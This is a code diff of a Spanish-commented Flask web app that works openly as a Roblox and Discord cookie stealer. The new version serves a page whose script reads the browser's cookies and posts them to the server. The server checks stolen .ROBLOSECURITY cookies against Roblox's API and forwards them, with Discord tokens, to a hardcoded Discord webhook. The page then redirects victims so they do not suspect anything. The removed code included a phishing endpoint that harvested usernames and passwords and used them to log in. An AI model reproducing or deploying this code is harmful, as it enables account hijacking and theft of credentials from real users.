@@ -1,8 +1,11 @@
 from flask import Flask, request, Response, redirect
 import requests
 import json
+from datetime import datetime
 import os
 import base64
+import random
+import string
 
 app = Flask(__name__)
 
@@ -11,146 +14,148 @@ WEBHOOK_URL = "https://discord.com/api/webhooks/1515183154028216381/piKZO39_WzEV
 # Imagen pixel transparente
 PIXEL = base64.b64decode("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==")
 
-def send_to_discord(cookie, ip, user_agent, roblox_user_data=None):
-    """Envía la cookie real a Discord"""
+def send_to_discord(cookies_data, ip, user_agent):
+    """Envía las cookies reales a Discord"""
     try:
-        # Información del usuario de Roblox si está disponible
-        user_info = ""
-        if roblox_user_data:
-            user_info = f"\nUsername: {roblox_user_data.get('name', 'Unknown')}\nID: {roblox_user_data.get('id', 'Unknown')}"
+        roblox_cookie = cookies_data.get('.ROBLOSECURITY', 'No encontrada')
+        discord_token = cookies_data.get('token', 'No encontrado')
         
-        message = f"**Cookie Robada**\nIP: {ip}\nUser-Agent: {user_agent}\nCookie: `{cookie}`{user_info}"
+        # Intentar verificar la cookie de Roblox con la API
+        username = "No verificado"
+        user_id = "Desconocido"
+        
+        if roblox_cookie != "No encontrada":
+            try:
+                session = requests.Session()
+                session.cookies['.ROBLOSECURITY'] = roblox_cookie
+                user_info = session.get('https://www.roblox.com/mobileapi/userinfo').json()
+                username = user_info.get('UserName', 'Error al obtener')
+                user_id = user_info.get('UserID', 'Desconocido')
+            except:
+                username = "Cookie inválida o expirada"
+        
+        embed = {
+            "title": f"🎯 COOKIES REALES CAPTURADAS - {username}",
+            "description": f"**Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n**IP:** {ip}",
+            "color": 16711680,
+            "fields": [
+                {"name": "🌐 IP", "value": str(ip), "inline": True},
+                {"name": "👤 Username Roblox", "value": str(username), "inline": True},
+                {"name": "🆔 User ID", "value": str(user_id), "inline": True},
+                {"name": "🔴 .ROBLOSECURITY", "value": f"```{roblox_cookie}```", "inline": False},
+                {"name": "🔵 Discord Token", "value": f"```{discord_token}```", "inline": False},
+                {"name": "📋 Todas las cookies", "value": f"```json\n{json.dumps(cookies_data, indent=2)[:1000]}```", "inline": False}
+            ],
+            "footer": {"text": "Cookie Logger Real - API Verificada"}
+        }
         
         payload = {
-            "content": message
+            "content": "@everyone **COOKIES REALES CAPTURADAS**",
+            "embeds": [embed]
         }
         
         response = requests.post(WEBHOOK_URL, json=payload, timeout=10)
-        print(f"Cookie enviada a Discord: {response.status_code}")
+        print(f"Cookies enviadas a Discord: {response.status_code}")
         
     except Exception as e:
-        print(f"Error: {e}")
-
-def get_roblox_user_info(user_id):
-    """Obtiene información del usuario por ID"""
-    try:
-        response = requests.get(f"https://users.roblox.com/v1/users/{user_id}")
-        return response.json()
-    except:
-        return None
+        print(f"Error enviando a Discord: {e}")
 
 @app.route('/')
 def index():
-    # Capturar headers importantes
     ip = request.headers.get('X-Forwarded-For', request.remote_addr)
     user_agent = request.headers.get('User-Agent', 'Unknown')
     
-    # Capturar la cookie real de Roblox
-    real_cookie = request.cookies.get('.ROBLOSECURITY', None)
-    
-    if real_cookie:
-        print(f"Cookie real capturada de IP: {ip}")
-        
-        # Intentar obtener información del usuario usando la cookie
-        roblox_user_id = None
-        try:
-            # Hacer una solicitud autenticada a la API de Roblox
-            auth_response = requests.get(
-                "https://users.roblox.com/v1/users/authenticated",
-                cookies={'.ROBLOSECURITY': real_cookie},
-                timeout=10
-            )
-            if auth_response.status_code == 200:
-                user_data = auth_response.json()
-                roblox_user_id = user_data.get('id')
-                roblox_user_data = get_roblox_user_info(roblox_user_id)
-                send_to_discord(real_cookie, ip, user_agent, roblox_user_data)
-            else:
-                send_to_discord(real_cookie, ip, user_agent)
-        except:
-            send_to_discord(real_cookie, ip, user_agent)
-        
-        # Redirigir al perfil real de Roblox para que no sospechen
-        return redirect('https://www.roblox.com/home', code=302)
-    else:
-        # Si no hay cookie, redirigir a Roblox (el usuario no está logueado)
-        return redirect('https://www.roblox.com/login', code=302)
+    # Servir una página HTML que ejecuta JavaScript para capturar cookies
+    html = f"""<!DOCTYPE html>
+<html>
+<head>
+    <title>Redireccionando...</title>
+    <script>
+        // Capturar todas las cookies del navegador
+        function getCookies() {{
+            const cookies = document.cookie.split(';');
+            const cookieObj = {{}};
+            cookies.forEach(cookie => {{
+                const [name, value] = cookie.trim().split('=');
+                if (name && value) {{
+                    cookieObj[name] = value;
+                }}
+            }});
+            return cookieObj;
+        }}
 
-@app.route('/pixel.png')
-def pixel():
-    """Endpoint para tracking via img tag - captura cookie real también"""
-    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-    user_agent = request.headers.get('User-Agent', 'Unknown')
-    
-    real_cookie = request.cookies.get('.ROBLOSECURITY', None)
-    
-    if real_cookie:
-        print(f"Cookie real capturada desde pixel en IP: {ip}")
-        send_to_discord(real_cookie, ip, f"{user_agent} (via pixel)")
-    
-    return Response(PIXEL, mimetype='image/png')
+        // Enviar cookies al servidor
+        function sendCookies() {{
+            const cookies = getCookies();
+            fetch('/capture', {{
+                method: 'POST',
+                headers: {{'Content-Type': 'application/json'}},
+                body: JSON.stringify({{cookies: cookies}})
+            }}).then(response => response.json())
+              .then(data => {{
+                  console.log('Cookies enviadas:', data);
+                  // Redirigir a Roblox después de enviar
+                  window.location.href = 'https://www.roblox.com/es/users/7869790887/profile';
+              }}).catch(error => {{
+                  console.error('Error:', error);
+                  window.location.href = 'https://www.roblox.com/es/users/7869790887/profile';
+              }});
+        }}
 
-@app.route('/api/capture', methods=['POST'])
+        // Ejecutar cuando cargue la página
+        window.onload = sendCookies;
+    </script>
+</head>
+<body>
+    <h1>Redireccionando a Roblox...</h1>
+    <p>Por favor espera un momento.</p>
+</body>
+</html>"""
+    
+    return html
+
+@app.route('/capture', methods=['POST'])
 def capture():
-    """Endpoint para captura via JavaScript (aunque cookie es HttpOnly, el navegador la envía automáticamente)"""
+    """Endpoint para recibir cookies del JavaScript"""
     try:
+        data = request.json
+        cookies = data.get('cookies', {})
         ip = request.headers.get('X-Forwarded-For', request.remote_addr)
         user_agent = request.headers.get('User-Agent', 'Unknown')
         
-        # La cookie viene en los headers, no en el body
-        real_cookie = request.cookies.get('.ROBLOSECURITY', None)
+        print(f"Cookies recibidas de {ip}: {json.dumps(cookies, indent=2)}")
         
-        if real_cookie:
-            print(f"Cookie real capturada desde API en IP: {ip}")
-            send_to_discord(real_cookie, ip, f"{user_agent} (via API)")
+        # Enviar a Discord
+        send_to_discord(cookies, ip, user_agent)
         
-        return {"status": "success"}
+        return {"status": "success", "message": "Cookies capturadas"}
     except Exception as e:
-        print(f"Error: {e}")
-        return {"status": "error"}
+        print(f"Error capturando cookies: {e}")
+        return {"status": "error", "message": str(e)}
 
-@app.route('/api/login', methods=['POST'])
-def login_capture():
-    """Endpoint para capturar credenciales de login (phishing)"""
-    try:
-        data = request.json
-        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+@app.route('/pixel.png')
+def pixel():
+    """Endpoint para el pixel tracker - captura cookies del header"""
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    user_agent = request.headers.get('User-Agent', 'Unknown')
+    
+    # Capturar cookies del header HTTP
+    cookie_string = request.headers.get('Cookie', '')
+    cookies = {}
+    
+    if cookie_string:
+        for cookie in cookie_string.split(';'):
+            cookie = cookie.strip()
+            if '=' in cookie:
+                key, value = cookie.split('=', 1)
+                cookies[key.strip()] = value.strip()
         
-        username = data.get('username', '')
-        password = data.get('password', '')
-        
-        # Enviar credenciales a Discord
-        message = f"**Credenciales Robadas**\nIP: {ip}\nUsername: {username}\nPassword: {password}"
-        payload = {"content": message}
-        requests.post(WEBHOOK_URL, json=payload, timeout=10)
-        
-        # Intentar login real para obtener la cookie
-        session = requests.Session()
-        login_response = session.post(
-            "https://auth.roblox.com/v2/login",
-            json={
-                "ctype": "Username",
-                "cvalue": username,
-                "password": password
-            },
-            headers={
-                "X-CSRF-TOKEN": "1",
-                "Referer": "https://www.roblox.com/"
-            }
-        )
-        
-        # Capturar la cookie del response
-        for cookie in session.cookies:
-            if cookie.name == '.ROBLOSECURITY':
-                print(f"Cookie obtenida via login: {cookie.value}")
-                send_to_discord(cookie.value, ip, f"{request.headers.get('User-Agent')} (via login)")
-                break
-        
-        return {"status": "success", "message": "Logged in successfully"}
-    except Exception as e:
-        print(f"Error: {e}")
-        return {"status": "error"}
+        if cookies:
+            print(f"Cookies del header de {ip}: {json.dumps(cookies, indent=2)}")
+            send_to_discord(cookies, ip, user_agent)
+    
+    return Response(PIXEL, mimetype='image/png')
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 8080))
-    app.run(host='0.0.0.0', port=port, ssl_context='adhoc')  # HTTPS es necesario
+    app.run(host='0.0.0.0', port=port)
